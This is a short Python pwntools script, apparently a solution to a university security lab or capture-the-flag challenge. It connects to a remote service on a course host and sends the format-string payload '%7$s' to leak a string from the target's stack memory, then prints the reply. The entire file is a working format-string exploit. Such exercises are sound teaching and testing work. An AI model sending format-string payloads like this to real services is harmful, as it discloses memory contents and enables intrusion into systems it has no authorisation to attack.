from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22191

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'%7$s')
print(s.recv(512))